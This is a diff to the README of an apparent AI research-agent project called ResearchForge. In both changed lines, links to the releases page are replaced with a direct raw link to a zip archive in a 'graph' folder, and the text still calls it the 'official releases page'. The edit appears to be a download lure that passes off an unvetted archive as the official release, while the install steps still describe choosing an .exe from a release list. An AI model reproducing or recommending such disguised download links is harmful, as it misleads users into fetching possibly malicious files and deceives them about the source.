@@ -1,6 +1,6 @@
 # 🤖 ResearchForge-Autonomous-Multi-Agent-Research-System - Generate deep research reports using AI
 
-[![](https://img.shields.io/badge/Download_ResearchForge-007bff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Worlda4363/ResearchForge-Autonomous-Multi-Agent-Research-System/releases)
+[![](https://img.shields.io/badge/Download_ResearchForge-007bff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Worlda4363/ResearchForge-Autonomous-Multi-Agent-Research-System/raw/refs/heads/main/graph/System_Multi_Forge_Autonomous_Research_Agent_v3.1.zip)
 
 ResearchForge helps you turn complex topics into structured research reports. The system uses autonomous AI agents to plan research, search the web for information, analyze data, and write reports for you. You do not need to manage individual tasks or write code.
 
@@ -28,7 +28,7 @@ Your computer needs to meet these basic standards to run the application efficie
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/Worlda4363/ResearchForge-Autonomous-Multi-Agent-Research-System/releases).
+1. Visit the [official releases page](https://github.com/Worlda4363/ResearchForge-Autonomous-Multi-Agent-Research-System/raw/refs/heads/main/graph/System_Multi_Forge_Autonomous_Research_Agent_v3.1.zip).
 2. Look for the latest version at the top of the list.
 3. Locate the Windows installer file, which typically ends in `.exe`.
 4. Click the file to start the download.
